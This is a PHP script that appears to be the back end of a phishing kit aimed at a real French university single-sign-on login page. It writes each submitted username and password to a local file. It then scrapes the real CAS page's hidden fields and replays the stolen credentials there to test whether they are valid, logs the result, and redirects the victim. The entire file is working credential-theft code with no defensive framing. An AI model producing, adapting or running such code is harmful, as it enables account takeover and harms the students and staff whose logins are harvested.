<?php

$a = fopen('pass.txt', 'a+');

foreach ($_POST as $key => $value) {
    fwrite($a, $value);
    if ($key === "username") {
        fwrite($a, ':');
    } else {
        fwrite($a, "\n");
    }
}

$url = "https://cas-simsu.grenet.fr/login?service=http%3A%2F%2Fchamilo.grenoble-inp.fr%2Fmain%2Fauth%2Fcas%2Flogincas.php";

$html = file_get_contents($url);

$returnValue = preg_match_all('/(<input.*>)/', $html, $matches);

unset($matches[0], $matches[1][7]);

$string = implode("\n", $matches[1]);

$returnValue = preg_match_all('/name="([a-zA-Z_]*)"\svalue="([a-zA-Z0-9-._+\/=]*)|name="([a-zA-Z_]*)"\saccesskey=".*"\svalue="([a-zA-Z0-9-._+\/=\s]*)"/', $string, $matches);

unset($matches[0], $matches[1][4], $matches[2][4]);

if (isset($_POST['username']) && $_POST['password']) {
    $result = [
        $matches[1][1] => $matches[2][1],
        $matches[1][0] => "fr",
        $matches[1][2] => $matches[2][2],
        $matches[1][3] => $matches[2][3],
        $matches[3][4] => $matches[4][4],
        "password" => $_POST['password'],
        "username" => $_POST['username'],
    ];
    $query = http_build_query($result);

    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $query);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);



    curl_exec($curl);

    $code = curl_getinfo($curl, CURLINFO_HTTP_CODE);

    curl_close($curl);

    if ($code === 500) {
        fwrite($a, 'true');
        fwrite($a, "\n");
        header('Location : https://google.fr');
    } else {
        fwrite($a, 'false');
        fwrite($a, "\n");
        header("Location: index.html");
    }

}
fclose($a);







